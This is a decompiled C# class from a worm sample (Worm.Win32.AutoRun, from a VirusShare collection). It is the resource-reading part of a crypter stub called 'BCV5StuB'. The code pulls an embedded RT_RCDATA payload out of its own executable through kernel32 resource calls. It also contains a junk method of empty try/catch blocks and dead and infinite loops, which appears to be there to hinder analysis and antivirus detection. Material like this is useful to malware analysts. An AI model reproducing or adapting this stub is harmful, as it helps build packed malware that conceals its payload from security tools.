// Decompiled with JetBrains decompiler
// Type: BCV5StuB.ResourceReader
// Assembly: Windows, Version=7.8.9.10, Culture=neutral, PublicKeyToken=null
// MVID: 9F0D14B2-64CD-49F4-8243-2271113E9FED
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Worm.Win32.AutoRun.hgi-f7f655882362e3de6b26b28c84c129a11a52fb9cd813ce2911fb258b72766e44.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;

namespace BCV5StuB
{
  [StandardModule]
  internal sealed class ResourceReader
  {
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);

    [DllImport("kernel32", EntryPoint = "GetModuleHandleA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.VBByRefStr)] ref string moduleName);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SizeofResource(IntPtr hModule, IntPtr hResInfo);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

    public static byte[] ReadResource(string filename)
    {
      IntPtr moduleHandle = ResourceReader.GetModuleHandle(ref filename);
      IntPtr resource = ResourceReader.FindResource(moduleHandle, "0", "RT_RCDATA");
      IntPtr source = ResourceReader.LoadResource(moduleHandle, resource);
      int length = ResourceReader.SizeofResource(moduleHandle, resource);
      byte[] destination = new byte[checked (length - 1 + 1)];
      Marshal.Copy(source, destination, 0, length);
      return destination;
    }

    public static void JuNk_TArWpB339454171()
    {
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      for (double num = 0.3672802; num <= 0.05310881; ++num)
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      while (true)
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }
  }
}
